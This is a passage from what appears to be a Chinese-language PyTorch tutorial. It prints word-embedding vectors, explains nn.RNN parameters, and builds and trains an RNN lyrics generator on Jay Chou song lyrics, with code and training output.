-0.4179268479347229, 0.4167310297489166, -0.6567360162734985, -0.7738466858863831, 0.9928999543190002, 0.5239269137382507, -0.37249624729156494, -0.6732262372970581, -2.235102891921997, -1.3211236000061035, -0.5702805519104004, 0.7115850448608398, -0.5283679366111755, -0.9706310033798218, 0.4394710063934326, 1.9765151739120483, 2.844550371170044, 1.3933804035186768, -1.071089506149292, 0.2864969074726105, -0.020159661769866943, -1.0760056972503662, 0.7690610289573669, -0.5425635576248169, -0.12007666379213333, -0.6873587369918823, -1.180539846420288, -0.011916521936655045, 1.1096831560134888, 0.6210238933563232, 0.027135400101542473, 0.3639536499977112, 0.993864893913269, -0.4164225161075592, 0.3271690309047699, 0.40985074639320374, 1.4573488235473633, 0.9820419549942017, 0.5789766907691956, 1.1851555109024048, -1.2971205711364746, 0.33617496490478516, -0.3047017753124237, 0.27652761340141296, -0.9369839429855347, -0.026159269735217094, 0.8137128353118896, -0.015559175983071327, -0.2985958755016327, -2.2304558753967285, -2.1107630729675293, 1.0383832454681396, -1.4547908306121826, -1.2483378648757935, 0.4881366789340973, 0.27501043677330017, -0.7989357113838196, 1.4601446390151978, 1.0553253889083862, 0.17138926684856415, -0.45287197828292847, 1.8369266986846924, 0.19166652858257294, -1.0581374168395996, -0.7617331147193909, 0.6080803871154785, -0.5222128033638, 0.2154778242111206, -0.9145902395248413, -0.6550857424736023, 0.6670337319374084, 0.2841850221157074, 1.5520975589752197, -0.41029027104377747, -0.8780690431594849, 0.6484847664833069, -1.389772653579712, -2.39544415473938, -1.698142409324646, -1.6761640310287476, -0.5713211894035339, 0.5054879188537598, -0.439106822013855, -1.0805776119232178, -1.0738043785095215, -0.22147268056869507, -1.2931756973266602, -1.7447654008865356, -0.2635822296142578, -0.38105618953704834, 0.088524229824543, 0.7569169998168945, -0.7295322418212891, -0.1692301481962204, -1.1889735460281372, 1.8446358442306519, -0.8288096189498901, -1.644872784614563, 0.07178768515586853, 0.9296861886978149, 1.2789150476455688, -0.5919066667556763, -0.14757634699344635] 四川 -\u0026gt; [0.7639459371566772, -0.660054624080658, -0.08635374158620834, -0.41890695691108704, 0.7900705337524414, -0.10140606015920639, 0.4720896780490875, -2.1445083618164062, 0.7043130397796631, -0.8396892547607422, -1.7390351295471191, 0.29287344217300415, -0.2598598599433899, 1.1453543901443481, -1.691605806350708, -0.32984253764152527, -1.0771393775939941, 0.12628982961177826, -1.0895458459854126, 0.6557487845420837, 0.9245684146881104, 0.6992956399917603, 0.2929307520389557, 1.2730282545089722, 0.9517784118652344, 1.6362038850784302, -0.06577905267477036, -0.12625154852867126, -0.21007876098155975, 1.417515754699707, 0.06356274336576462, 0.1672062873840332, -0.14522509276866913, -0.6984828114509583, -0.8967545628547668, 0.6959110498428345, 0.08421899378299713, 0.9785493612289429, -0.4335647225379944, -1.9969183206558228, 2.3934972286224365, 1.669681429862976, -1.094510793685913, 1.2458893060684204, -0.26701512932777405, -1.2686049938201904, -0.7705062031745911, 0.7624711394309998, 0.23258371651172638, -1.6723850965499878, 0.6332679390907288, -0.2207077294588089, -0.8182200789451599, 1.0712546110153198, -0.08216150850057602, 0.11058936268091202, -0.2188360095024109, 2.403790235519409, 0.8505138158798218, -0.29030895233154297, -1.3257994651794434, 0.997616171836853, -0.754666268825531, 0.6795787811279297, -1.4827628135681152, -1.29130220413208, -0.306960791349411, -0.004058618564158678, -1.03386652469635, 0.2599014341831207, 1.5488905906677246, -1.1801602840423584, -0.04927394539117813, 2.0203394889831543, 0.34747564792633057, 0.7936400771141052, -1.9471760988235474, -0.2748616337776184, 0.8032112121582031, -0.97441565990448, 1.0562200546264648, 0.4987774193286896, 1.4722212553024292, 1.2849000692367554, 0.5363295674324036, 2.090388536453247, 0.2972404360771179, 0.6321299076080322, -2.443924903869629, -0.5117645263671875, 0.8579564094543457, -0.7760249376296997, 0.7403879165649414, -0.13470539450645447, -1.7935080528259277, -1.0757124423980713, -0.6320903897285461, 0.7336604595184326, 2.0827550888061523, -1.602760910987854, 0.16270942986011505, -1.0851973295211792, 1.267317771911621, -0.44165411591529846, 1.4766086339950562, -1.5308431386947632, -0.7466219663619995, -0.5175436735153198, 2.3212132453918457, 0.8788610100746155, 0.26752519607543945, 1.0927706956863403, 0.2308245152235031, 2.395909547805786, -1.0620023012161255, -1.5863486528396606, -0.37703272700309753, 0.6864315271377563, 0.5820862650871277, 1.4480952024459839, 0.09708879142999649, 0.34581759572029114, -0.3975397050380707, 1.173356056213379, -0.7262426614761353, -0.4707520306110382, -1.6837925910949707, 0.3518792390823364] 成都 -\u0026gt; [0.56243896484375, 1.4777281284332275, 0.4997352063655853, 1.0969278812408447, 0.7628512978553772, 1.7217930555343628, -0.40213480591773987, -0.5143151879310608, -2.4896655082702637, -0.35010015964508057, 2.312429189682007, -0.6234450340270996, 1.5870294570922852, 0.9043256044387817, 0.979636549949646, 2.0384109020233154, -0.01772027090191841, 1.2573158740997314, 1.4020342826843262, 1.0658103227615356, -0.27821195125579834, -1.0903197526931763, 0.40434160828590393, -1.1213923692703247, -0.21690411865711212, -2.405766248703003, 0.2388550341129303, 0.4941626787185669, 0.5749419927597046, -1.6343562602996826, -0.3733586370944977, 0.033875722438097, 1.96085786819458, -0.7303372621536255, 1.248095989227295, 0.05076742544770241, -0.1411282867193222, -0.680297315120697, 2.2530136108398438, -2.905562400817871, 0.028334857895970345, -0.331263929605484, 1.8674354553222656, -0.6284685134887695, 1.0690555572509766, 0.4204407036304474, 1.2775059938430786, 0.20274092257022858, -0.4572921693325043, 1.0441139936447144, -0.04267473891377449, -1.0923773050308228, 2.450409173965454, 0.04830460250377655, 0.07777398079633713, 0.2420053482055664, 0.9271904826164246, -0.6963448524475098, 2.0232656002044678, 0.8172881007194519, -0.5111582279205322, -0.7655945420265198, 2.400362491607666, -2.3128511905670166, -0.49751365184783936, 0.8380289673805237, 0.29281502962112427, -0.2212970107793808, -0.2090066373348236, 1.088941216468811, -1.0725855827331543, -0.07908947765827179, -0.13858187198638916, -0.7048135995864868, -0.18928736448287964, -0.020287740975618362, -1.050644874572754, 0.5913116931915283, 0.006256016902625561, 1.3219653367996216, -0.7687020301818848, 0.14103731513023376, 0.0016240208642557263, -1.2730432748794556, -0.1441194862127304, -0.8608500361442566, -1.0339374542236328, 0.7806683778762817, 0.7678371667861938, -1.5007939338684082, -0.6163219809532166, 0.22171591222286224, 0.6179243922233582, 0.06138891354203224, 1.0564122200012207, 0.6745894551277161, 0.8391706347465515, 0.004445864353328943, -0.5395381450653076, 0.21040350198745728, 0.965447187423706, -0.07339546829462051, 1.7722938060760498, -1.0979887247085571, 0.7095265984535217, -0.22573591768741608, -0.2532839775085449, 0.345893532037735, 0.49645504355430603, -0.22295160591602325, -0.3253420293331146, 0.18388471007347107, -0.7767135500907898, -0.5512225031852722, -0.2734062075614929, -0.15085825324058533, 0.43957316875457764, 1.3614509105682373, 1.2428990602493286, 0.8182045817375183, 0.5461722016334534, -0.41816452145576477, -0.19024881720542908, -0.45834967494010925, -0.6916024088859558, -2.3069822788238525, -2.3388330936431885, 0.294677734375] ， -\u0026gt; [-0.33787408471107483, -1.3094017505645752, -0.06432336568832397, -1.0921032428741455, -0.04095187038183212, -0.953260600566864, 1.372378945350647, -0.6234164834022522, 0.861510157585144, -0.2992742359638214, -0.5599021315574646, 0.476374089717865, -2.0908029079437256, -1.0384407043457031, 0.2720696032047272, 1.0667717456817627, 0.07459308952093124, -0.264820396900177, -0.7853105068206787, -0.033309247344732285, 0.2928711771965027, 0.4753778576850891, 0.21960414946079254, -1.3768391609191895, -1.0830707550048828, 0.4983312487602234, 1.9078577756881714, 0.138449564576149, -0.8132482767105103, -0.20288391411304474, -1.36941659450531, 0.1078270897269249, -1.6963082551956177, -0.03481857106089592, -1.0912704467773438, 1.4659584760665894, 0.1895529329776764, -0.33048200607299805, 1.1222764253616333, -0.18429803848266602, -0.9224066138267517, -0.46710413694381714, 0.4822205901145935, -0.4209873080253601, -0.04612121731042862, 1.659363031387329, 1.560346007347107, -0.1867826133966446, 0.2480340152978897, 0.13798049092292786, -0.2595059275627136, 0.6765235662460327, -1.193811058998108, -0.9169279932975769, 1.3021773099899292, -1.1234501600265503, 1.3536704778671265, -1.2806051969528198, 1.3554661273956299, -0.8482236862182617, 0.41685938835144043, 2.065185785293579, 1.1324994564056396, -1.1211353540420532, -0.7691621780395508, 0.11613759398460388, 0.013647863641381264, 2.055845260620117, 1.4118510484695435, -0.19109390676021576, 0.6356171369552612, -0.7232450246810913, -1.6852675676345825, -1.0326565504074097, 0.9595025777816772, 0.5682767629623413, -0.8269544839859009, -0.14660421013832092, -1.7345532178878784, -0.05637021362781525, 1.1968082189559937, 0.04985278844833374, -0.5233662128448486, -0.9858769774436951, 0.33265429735183716, 0.04952392727136612, 0.26295122504234314, -1.0770411491394043, 1.9539353847503662, 0.6972767114639282, -0.6182871460914612, -2.249014139175415, 0.7948842644691467, -0.8970513343811035, -0.7566987872123718, -1.8652397394180298, 0.7252744436264038, -2.2766242027282715, -0.30294767022132874, -2.074877977371216, 1.808603048324585, 2.3689382076263428, -0.07377711683511734, -1.1722602844238281, -0.4107270836830139, 0.7841655015945435, -1.2185114622116089, -0.45550736784935, 1.2937835454940796, 0.2953551709651947, 0.28018659353256226, 1.317701816558838, 0.7412610054016113, 0.9395641684532166, -0.7370730638504028, 0.21863065659999847, 1.6849689483642578, -0.9418413043022156, 1.3929885625839233, -0.6308969855308533, 0.4914607107639313, 0.35774946212768555, 0.14206045866012573, -1.0362331867218018, 2.092369794845581, -1.212904453277588, -0.954627513885498, -0.9904732704162598] 是 -\u0026gt; [-1.0381309986114502, 0.13718514144420624, 3.8931920528411865, -2.0787062644958496, -0.9909481406211853, 1.2365304231643677, 0.14260700345039368, 0.13479892909526825, 0.30499759316444397, 0.4600023031234741, 1.8234951496124268, 0.6081579327583313, -1.3596107959747314, 0.7735426425933838, 0.4919971227645874, -1.3641643524169922, 1.237881064414978, -0.6730667352676392, -0.9279845952987671, -0.07291223853826523, 0.005679577123373747, 0.822374701499939, -0.9734363555908203, -0.8951475024223328, 0.46311473846435547, 1.8462002277374268, -0.2588288187980652, 0.4701385498046875, 0.9768430590629578, 1.1862082481384277, -0.532867431640625, -2.6098439693450928, 0.16334624588489532, -0.2312006801366806, 0.04538475722074509, 1.5012876987457275, 1.8384860754013062, -0.946250855922699, -0.43893951177597046, 0.17583389580249786, 1.4166406393051147, 0.8954916596412659, 1.554394006729126, -0.6380833983421326, -0.06268838793039322, 1.1698411703109741, -0.4295130670070648, -0.3615911602973938, -0.9524906873703003, 0.41601669788360596, -0.17511416971683502, -0.020355144515633583, -0.5950009226799011, 1.0813703536987305, -0.11183588206768036, -1.2964600324630737, 2.048386573791504, 0.43394115567207336, -0.34899622201919556, -1.2100651264190674, -0.5326148271560669, 0.38617876172065735, -0.986335039138794, -2.582519769668579, 1.3733240365982056, -0.2605557143688202, -0.21359194815158844, 1.6070479154586792, -0.2156515270471573, -0.19509197771549225, -1.6181598901748657, -1.1318364143371582, -0.5061348676681519, 0.25062844157218933, 0.0032534294296056032, -0.25270673632621765, -0.13427601754665375, -0.06254970282316208, 0.4892120659351349, -0.8235657811164856, -0.6076521873474121, -1.3053886890411377, -0.43925970792770386, 1.324268102645874, 0.9528844952583313, -0.47715362906455994, 0.3556428551673889, 0.211994931101799, -0.6904019713401794, -1.3862437009811401, -0.322297602891922, -0.3010545074939728, -0.836707353591919, -1.6331428289413452, -0.30824604630470276, -1.9453868865966797, -1.624407172203064, -0.5701942443847656, 0.03189626336097717, -1.5300270318984985, 0.397626131772995, 0.09802354127168655, 2.5223982334136963, 1.1541708707809448, -1.5273308753967285, -1.4219385385513306, 0.75459223985672, 1.1492969989776611, -0.47371330857276917, 2.405719041824341, -0.9892557859420776, -1.454994797706604, 0.29766565561294556, -0.22816257178783417, 1.8712615966796875, 1.545329213142395, -0.8563598394393921, 1.5104244947433472, -0.29827380180358887, 0.7789028882980347, 0.7176946401596069, -1.2561675310134888, -0.85163414478302, 0.02971484512090683, -0.5711592435836792, 0.4415961503982544, -1.4320781230926514, 0.44245144724845886] 中华人民共和国教育部 -\u0026gt; [0.14025051891803741, -0.5883216857910156, 1.056982398033142, 1.398756980895996, 1.2855510711669922, -0.9107669591903687, -1.406931757926941, 0.4232429265975952, 0.138737291097641, 0.41513851284980774, 0.24644315242767334, -1.2017205953598022, 0.6361500024795532, -0.03634294122457504, 0.7052356004714966, 0.6098170876502991, -0.3026246726512909, -1.4279675483703613, 1.588690161705017, 0.6018990278244019, 1.6895304918289185, 0.003920222632586956, 1.4023375511169434, -1.3140830993652344, -0.9500641822814941, -0.18963374197483063, 0.7632401585578918, -2.6280431747436523, -0.6997641324996948, 0.8201631307601929, 1.6689854860305786, -0.005850125104188919, 0.8181517720222473, 0.9020212888717651, 0.9376468062400818, 0.6025412678718567, 0.19286642968654633, -2.0545268058776855, -0.5015175938606262, 0.8119596838951111, 0.518287718296051, 0.7443577647209167, 0.12724363803863525, -0.4288278818130493, -0.5430804491043091, 1.6007821559906006, -1.7710744142532349, 1.045377492904663, -0.13337315618991852, 0.5695350170135498, 0.611879825592041, 0.8327794671058655, -3.0777602195739746, -1.4227104187011719, 1.6461505889892578, -1.138787865638733, -0.5175765156745911, -0.6527858972549438, -0.4465395510196686, 0.019725844264030457, -1.4563722610473633, -0.3762948215007782, 1.2026947736740112, 0.7340081930160522, -0.5348214507102966, -0.7487169504165649, -0.3007497489452362, -1.6888025999069214, 0.7306185364723206, -0.469486266374588, -0.9775107502937317, -0.21138161420822144, 0.7867814898490906, 1.2474416494369507, 0.097927987575531, -0.29573315382003784, 0.023264342918992043, -0.1560763567686081, 0.722339928150177, 0.5893672704696655, -0.024296792224049568, 1.7033941745758057, -0.3186756372451782, -2.038273811340332, 0.2632593512535095, 0.7503422498703003, 0.18595272302627563, -1.7183271646499634, 0.7696282267570496, 0.6995213031768799, -0.3682793080806732, -2.2420945167541504, 0.9661995768547058, 1.4557089805603027, 0.1969800740480423, -0.9218257665634155, -0.5476601719856262, -0.30923694372177124, -0.8398916125297546, 1.4972319602966309, -0.3774861693382263, -0.21029157936573029, 2.224287986755371, 0.2102212756872177, 0.18242454528808594, 0.04718697443604469, 0.2859799861907959, -1.1755571365356445, 0.30829644203186035, -0.0006614835583604872, -0.36983150243759155, 1.4986408948898315, 0.9627066850662231, 1.6044225692749023, 1.7419381141662598, -1.3149410486221313, -1.1165934801101685, 2.3712234497070312, 0.8730128407478333, -1.9619089365005493, -0.07330694049596786, 0.688816487789154, -0.4210284650325775, -0.7613076567649841, -0.1594087779521942, 1.3634997606277466, 1.6164549589157104, 0.3564639687538147] 直属 -\u0026gt; [-0.33789971470832825, 1.3584284782409668, -0.5811788439750671, -0.6095796823501587, -0.6302621960639954, -0.6341601014137268, 1.420705795288086, 0.13715553283691406, -2.060513734817505, 1.26814603805542, -0.23949818313121796, 1.1931129693984985, -1.0386868715286255, -0.3954807221889496, 0.5195523500442505, 0.754364550113678, 0.20388828217983246, -0.4023708403110504, -0.02800746262073517, -2.2803475856781006, 1.1303919553756714, -0.5699470639228821, -0.3445722758769989, -1.151837944984436, 0.5616161227226257, -0.07560509443283081, 1.9034521579742432, -0.8097555041313171, 1.5177966356277466, -1.3630318641662598, -0.30350542068481445, 0.39291444420814514, -0.7752071619033813, 1.1337178945541382, 0.5776795744895935, 0.9621323347091675, 0.7165736556053162, -0.7049280405044556, -0.6581589579582214, 2.2558507919311523, 0.6021068692207336, -1.278320074081421, 1.2918076515197754, 0.014823876321315765, -1.7895697355270386, -0.07380425184965134, -0.6859892010688782, -1.3862357139587402, 0.434276819229126, 0.5077678561210632, -0.7565757632255554, 0.7231796383857727, -2.8456947803497314, -0.6417722105979919, 0.189362570643425, -0.839449942111969, 0.5829066634178162, -0.579809308052063, -0.2484005242586136, 0.6170995235443115, -0.9293689727783203, 0.15690799057483673, 0.10465901345014572, -0.22713077068328857, -0.40781092643737793, -0.6484670639038086, -0.09114891290664673, 0.6100202202796936, 0.43622541427612305, -0.31834375858306885, -0.561362087726593, -0.6336369514465332, 1.3107948303222656, 0.8724061250686646, 0.8782907128334045, 0.7980823516845703, -1.503814697265625, 2.432075023651123, -0.39363643527030945, -0.11639916151762009, -0.39047491550445557, 0.3356471657752991, -0.7154036164283752, 0.2089829444885254, -1.274901032447815, -1.2903138399124146, 0.4787827730178833, 0.8754767775535583, -0.36598432064056396, -0.8223683834075928, -0.5764500498771667, 0.5468283295631409, -0.005182052031159401, 2.0755088329315186, -0.20317433774471283, 0.7980713248252869, -0.13998694717884064, 0.845341145992279, -1.0122485160827637, 1.019565224647522, 1.4568798542022705, -1.8541587591171265, -0.08164568245410919, 0.8209619522094727, 0.539742112159729, 1.7721991539001465, 1.7427912950515747, -0.9580423831939697, -1.1708639860153198, -0.07433973252773285, 1.1893250942230225, -0.4009150564670563, -0.5625899434089661, -1.648033618927002, 0.5622848272323608, -1.4640545845031738, -1.2228060960769653, 0.8409449458122253, -0.05045817047357559, -0.7518205642700195, -1.115128517150879, 1.3314285278320312, -0.4583549499511719, -0.22974802553653717, -0.2134741246700287, 1.346194863319397, 0.6285591125488281, 0.04430529847741127] 全国 -\u0026gt; [-1.5520007610321045, 0.3314692974090576, 0.08914195001125336, -0.0056284223683178425, -0.9564746618270874, -0.40461617708206177, 0.13070593774318695, 1.686263084411621, 1.010897159576416, 0.8405971527099609, 0.15378746390342712, 0.9534083008766174, 0.23421438038349152, 0.08166507631540298, -0.25529566407203674, -0.7175579071044922, 0.4626561999320984, 0.7876096963882446, 0.9008212089538574, 0.3049789071083069, -0.09401117265224457, -1.4717092514038086, 1.6372592449188232, -0.24522098898887634, 0.12768657505512238, -0.580763041973114, -0.4987027049064636, 0.8773986101150513, -0.13349944353103638, -0.08767732232809067, -0.28354188799858093, -0.03146464750170708, 0.40214914083480835, -1.0805237293243408, 1.311383605003357, -1.5334444046020508, 1.6689292192459106, 1.8921211957931519, 0.1684861183166504, 1.2055963277816772, 0.06375385820865631, 0.610754132270813, -1.09141206741333, -0.272737979888916, 0.8392224907875061, -0.9453503489494324, -0.15187454223632812, 0.53958660364151, -0.4521462321281433, -0.44379866123199463, 0.5150322914123535, -0.35866037011146545, 1.8172500133514404, 0.6289143562316895, 0.97475665807724, -0.25434234738349915, -0.18379847705364227, -0.8135579824447632, -0.4091949164867401, 0.14109547436237335, -2.461815118789673, 1.3043322563171387, -2.3017876148223877, -0.6164878606796265, -0.4214482605457306, 0.47513189911842346, -0.7553485035896301, -0.2020123153924942, 0.47444117069244385, 1.2666491270065308, -0.46207693219184875, 1.9876667261123657, -1.7732608318328857, 1.075785756111145, -2.8453588485717773, -0.820521891117096, -0.7866068482398987, 0.8140893578529358, -1.9845681190490723, -0.4685239791870117, -0.06957542151212692, 1.1858913898468018, 0.3000602722167969, -1.6092876195907593, 0.44625040888786316, -0.17546935379505157, -0.9834369421005249, -0.12012048065662384, 2.1486434936523438, -1.6368743181228638, 1.181698203086853, -0.09896392375230789, -0.7479424476623535, 0.8604170083999634, -0.1014096736907959, 0.9558519124984741, -0.21039994060993195, -0.18168802559375763, -1.9284073114395142, 0.02403911016881466, -0.5795352458953857, -0.08818890154361725, -0.08199119567871094, 0.039158958941698074, -0.28986191749572754, -0.81545490026474, 0.8709331154823303, -0.8589040637016296, 1.9099797010421753, 1.0797122716903687, -0.657086193561554, -0.5038485527038574, 1.448275089263916, 0.371888667345047, 1.253653883934021, -1.170638918876648, -1.3922667503356934, -0.6512734293937683, 1.5548454523086548, 0.2577717900276184, 0.4874401390552521, 0.13227622210979462, -0.33626890182495117, 0.6618170142173767, -1.2863892316818237, -0.1770940124988556, -0.7055754065513611, 1.3789422512054443] 重点 -\u0026gt; [1.1949406862258911, -0.012182194739580154, 0.8961377739906311, 0.7839514017105103, -0.18879392743110657, -0.39553102850914, -0.2632424235343933, -0.938086986541748, 1.3489576578140259, -0.4624161422252655, -1.3119703531265259, 0.5095743536949158, 0.1330413520336151, -1.4793245792388916, -1.9383506774902344, 0.20698249340057373, 2.5029187202453613, -0.35258620977401733, 0.5366807579994202, -2.0697383880615234, -1.5056042671203613, -0.8820537328720093, -0.3993379473686218, 0.05287330597639084, 0.7160015106201172, -0.47868359088897705, 0.15337057411670685, -0.6627570390701294, -1.9589228630065918, 0.8543242812156677, -0.48553666472435, 0.2018612027168274, -0.26615840196609497, -1.2309821844100952, 0.051297858357429504, -0.20254108309745789, -0.10170754045248032, -0.5889589786529541, 0.7253758311271667, -0.39362308382987976, -0.568123459815979, -0.06739899516105652, -0.9299246668815613, 0.059613823890686035, -1.1932049989700317, 0.1409657895565033, -1.029586672782898, 1.0887030363082886, -1.1189749240875244, -1.730431318283081, 0.005612374283373356, 0.5359809994697571, 0.6329437494277954, 0.4694022834300995, -1.2981356382369995, 0.5264517068862915, -0.10433857887983322, -0.331701397895813, -0.3174913227558136, -1.4151962995529175, 0.005109786055982113, 0.9603325128555298, -0.3973565399646759, 0.23845700919628143, 1.1231367588043213, -0.44293013215065, -0.6706748008728027, 1.1240535974502563, -0.5034427642822266, -0.5822576284408569, 1.5443520545959473, -1.6841453313827515, 0.06877513229846954, -1.740064024925232, 1.1700929403305054, -0.34096410870552063, 0.0911058783531189, 0.6429353952407837, 0.27809223532676697, -0.7784138321876526, 1.1370183229446411, 0.014460142701864243, -0.28068944811820984, -0.30486515164375305, 0.8224811553955078, -2.0884850025177, -0.7780076861381531, 1.1283482313156128, -0.11650309711694717, 2.2403976917266846, 1.5255331993103027, 0.4878126084804535, -0.811322033405304, 1.0219014883041382, 0.6292736530303955, -1.2825417518615723, 0.7980432510375977, 1.142793893814087, -0.4022769033908844, -1.4298145771026611, 0.9908952713012695, 1.0863277912139893, -0.2719363272190094, -1.0888563394546509, 0.32725587487220764, 0.3708494305610657, -0.09677056968212128, 0.27237048745155334, -0.37364158034324646, 0.030335577204823494, 1.1755188703536987, -0.3344758450984955, 0.47455546259880066, -0.6940397024154663, 0.4407373070716858, -1.0097383260726929, -0.017465421929955482, -0.36444470286369324, -1.780834436416626, 0.11095383763313293, 0.44742828607559204, 0.4113369882106781, 0.8977880477905273, -0.5807644128799438, -0.07540850341320038, 0.47065648436546326, -0.4016966223716736, 0.1848985105752945] 大学 -\u0026gt; [-1.4475852251052856, -0.17752867937088013, -0.7879891991615295, 1.2863266468048096, 0.5554264783859253, 0.7422486543655396, 0.647564709186554, -0.4495318830013275, 0.5519548058509827, 0.1076410636305809, -1.4149372577667236, 0.10615064203739166, 0.07769380509853363, -0.8733966946601868, -0.2317454218864441, -0.8407759070396423, -0.6344646215438843, -0.10932822525501251, 0.9894860982894897, 0.518584668636322, 0.12721653282642365, -1.2334426641464233, -0.7602449655532837, -0.1530931144952774, 0.7784685492515564, 0.6280393600463867, -0.34914520382881165, -0.986354649066925, 0.05498924106359482, -0.5254408121109009, -0.15824776887893677, 0.16335463523864746, 0.4538341760635376, -0.08873286098241806, 0.2933367192745209, 0.020767442882061005, -0.8800519704818726, 0.37006673216819763, -0.7811611294746399, -1.2028112411499023, -1.0187177658081055, -0.27793389558792114, 2.092510938644409, 1.4004042148590088, 0.9561623930931091, 0.9958055019378662, -0.9844347238540649, -1.1637202501296997, 0.5800871253013611, -0.6730059385299683, 1.3405460119247437, -0.14193913340568542, 0.8394786715507507, 1.0213227272033691, -0.19199487566947937, -0.69403475522995, -1.3983559608459473, 0.3184455633163452, 0.33800598978996277, 0.9688117504119873, 0.23558557033538818, 1.587860345840454, -1.1090397834777832, -1.1135281324386597, 0.22917072474956512, 0.5204218029975891, 0.8698641061782837, -0.9962738752365112, 0.751709520816803, 0.07302659749984741, -0.5218413472175598, 0.5482472777366638, -0.35429203510284424, -0.20083633065223694, 1.3695396184921265, 1.0042166709899902, 0.4688868820667267, 1.1620533466339111, 2.3771159648895264, 0.8834945559501648, 0.6229496002197266, -0.4971642792224884, -1.3196049928665161, -0.30771127343177795, 0.9008187055587769, 0.5891910195350647, -0.8497917056083679, -0.3938082456588745, -0.3030562996864319, -0.5590260028839111, 0.49924609065055847, -0.42346131801605225, -0.2595711052417755, 0.7297765612602234, -0.3204481899738312, -0.3209802508354187, -1.5807064771652222, 0.7140669822692871, 1.0739787817001343, -0.5437872409820557, -0.810208797454834, 0.5369143486022949, 0.4794268310070038, 0.8579863905906677, -0.5213403105735779, 0.5756368637084961, 1.5243277549743652, 1.427191138267517, 1.70316481590271, 0.6414663791656494, -1.61505126953125, 1.7495568990707397, -0.7892530560493469, 0.7378950119018555, -1.5114903450012207, 0.7335148453712463, -0.6459513902664185, -1.5614869594573975, 0.09263267368078232, -0.19371019303798676, -1.8619593381881714, -0.2190641313791275, -0.62592613697052, 0.7170789837837219, 2.0938637256622314, 0.04755529761314392, 0.8852423429489136, 0.24461376667022705] RNN 用于处理有序列特性的数据：语言、语音、天气等 图示： Pytorch：torch.nn.RNN(input_size,hidden_size,num_layer) input_size：输入数据的维度，一般为词向量的维度 hidden_size：隐藏层h的维度，也是当前层神经元输出的维度 num_layer：隐藏层h的层数，默认为1 1 2 3 4 5 6 7 8 9 10 11 12 import torch import torch.nn as nn print(words_to_index) # 定义RNN，input_size为每个分词嵌入后的维度，hidden_size为RNN隐状态维度 rnn = nn.RNN(input_size=128,hidden_size=64,num_layers=1) # inputs的第一个维度为时间步数（分词数量），第二个维度为batch，第三个维度为分词嵌入维度 inputs = embeddings.unsqueeze(0).permute(1,0,2) # h0第一个维度为RNN层数，第二个维度为batch，第三个维度为每个h的维度 h0 = torch.zeros(size=(1,1,64)) print(inputs.shape) y,h = rnn(inputs,h0) {'电子科技大学': 0, '（': 1, 'UESTC': 2, '）': 3, '位于': 4, '四川': 5, '成都': 6, '，': 7, '是': 8, '中华人民共和国教育部': 9, '直属': 10, '全国': 11, '重点': 12, '大学': 13} torch.Size([14, 1, 128]) 词表生成 1 2 3 4 5 6 7 8 9 # 导入工具包 import torch import re import jieba import torch.nn as nn import torch.nn.functional as F import torch.optim as optim import time from torch.utils.data import DataLoader D:\\Program\\Anaconda\\envs\\dlab\\lib\\site-packages\\jieba\\_compat.py:18: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026lt;81. import pkg_resources 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # 加载数据，构建词表 def Tokenizer(path = \u0026#34;./Dataset/6_RNN_Zhoujielun/jaychou_lyrics.txt\u0026#34;): all_word_list = [] with open(path,\u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;) as file: for line in file: if not line: continue # 跳过空行 words = jieba.lcut(line) all_word_list.extend(words) word_list = list(dict.fromkeys(all_word_list)) word_to_index = {word:index for index,word in enumerate(word_list)} index_to_word = {index:word for word,index in word_to_index.items()} all_index = [word_to_index[word] for word in all_word_list] return word_to_index,index_to_word,all_index,len(word_to_index) # 构建数据集类，构建可迭代对象 class LyricsDataset(torch.utils.data.Dataset): def __init__(self,all_indix,sent_len): # 输入原始字典和句子长度 super().__init__() self.all_indix = all_indix # 完整索引 self.sent_len = sent_len # 句子长度 self.word_num = len(all_indix) # 分词总数 self.sent_num = self.word_num // self.sent_len # 句子总数 def __len__(self): return self.sent_num def __getitem__(self,idx): if idx \u0026lt; 0: idx =0 if idx \u0026gt; self.word_num-self.sent_len-1 : idx = self.word_num-self.sent_len-1 x = torch.tensor(self.all_indix[idx:idx+self.sent_len]) y = torch.tensor(self.all_indix[idx+1:idx+self.sent_len+1]) return x,y 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 构建模型 class LyricsGenerator(nn.Module): def __init__(self,word_count): super(LyricsGenerator,self).__init__() self.ebd = nn.Embedding(word_count,128) # 将一个分析维度转为128 self.rnn = nn.RNN(input_size=128,hidden_size=128,num_layers=4) self.out = nn.Linear(128,word_count) def forward(self,inputs,hidden): emb = self.ebd(inputs).permute(1,0,2) output,hidden = self.rnn(emb,hidden) output = self.out(output.reshape((-1,output.shape[-1]))) return output,hidden def init_hidden(self,bs=2): return torch.zeros(4,bs,128) 1 2 3 word_index,index_word,all_index,dict_len = Tokenizer() word_dataset = LyricsDataset(all_index,10) word_dataset.__getitem__(0) Building prefix dict from the default dictionary ... Loading model from cache C:\\Users\\leuco\\AppData\\Local\\Temp\\jieba.cache Loading model cost 0.566 seconds. Prefix dict has been built successfully. (tensor([0, 1, 2, 3, 0, 4, 5, 6, 7, 8]), tensor([1, 2, 3, 0, 4, 5, 6, 7, 8, 3])) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # 模型训练 def train_model(model,data_loader,epochs=100,device=\u0026#39;cpu\u0026#39;): model.train() model.to(device) criterion = nn.CrossEntropyLoss() optimizer = optim.Adam(model.parameters(),lr=0.001) for epoch in range(epochs): total_loss = 0 total = 0 for batch_index,(X,y) in enumerate(data_loader): X = X.to(device) y = y.to(device) hidden = model.init_hidden() hidden = hidden.to(device) optimizer.zero_grad() output,hidden = model(X,hidden) y = torch.transpose(y,0,1).contiguous().view(-1) # 展平为一维 loss = criterion(output,y.long()) loss.backward() optimizer.step() total_loss+=loss total+=1 if epoch % 10 == 0: print(f\u0026#34;Epoch[{epoch}] : Loss = {total_loss/total:.5f}\u0026#34;) data_loader = DataLoader( word_dataset, shuffle=True, batch_size=2, drop_last=True ) model = LyricsGenerator(dict_len) train_model(model,data_loader,device=\u0026#39;cuda\u0026#39;) Epoch[0] : Loss = 3.31849 Epoch[10] : Loss = 0.33738 1 2 3 ```python 